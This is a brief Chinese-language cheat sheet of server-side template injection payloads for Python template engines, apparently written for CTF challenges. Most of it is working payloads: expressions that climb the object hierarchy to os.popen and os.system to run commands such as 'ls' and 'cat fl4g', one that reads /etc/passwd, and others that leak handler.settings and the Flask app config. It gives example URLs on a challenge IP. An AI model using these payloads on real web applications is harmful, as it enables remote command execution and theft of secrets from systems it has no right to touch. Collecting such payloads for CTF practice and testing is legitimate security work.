# SSTI

## 1

* 获取字符串的类对象

  ```
  {{''.__class__}} 
  ```

  感觉没用

* 寻找基类

  ```
   ''.__class__.__mro__
  ```

  一般来说找到<type 'object'>

* 寻找可用引用

  ```html
http://.../{{''.__class__.__mro__[2].__subclasses__()}}
  ```

* 找到 os 所在的 site._Printer 类（如在第72位）

  ``` html
  http://.../{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os']. popen('命令').read()}}
  <!-- 例如
  1. {{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}  在当前目录使用 ls 命令
  2. {{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}  在当前目录查看fl4g
  -->
  ```

* 一些其他的payload

  ``` html
  {{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[' os'].popen('cat fl4g').read()}}
  <!-- <type 'site._Printer'> -->
  ```

  ```html
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[' os'].system('ls') }} 
<!-- <type 'site._Printer'> -->
  ```

  ```html
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
<!-- <type 'file'> -->
  ```

## 2

当以上方法被屏蔽时（操作符被过滤）

* try

  ```html
  {{handler.settings}}
  <!-- http://220.249.52.133:44416/error?msg={{handler.settings}} -->
  ```

  ```html
  {{url_for.__globals__}}
  <!-- http://220.249.52.133:37426/shrine/{{url_for.__globals__}} -->
  {{url_for.__globals__['current_app'].config}}
  <!-- http://220.249.52.133:37426/shrine/{{url_for.__globals__['current_app'].config}} -->
  ```
  
  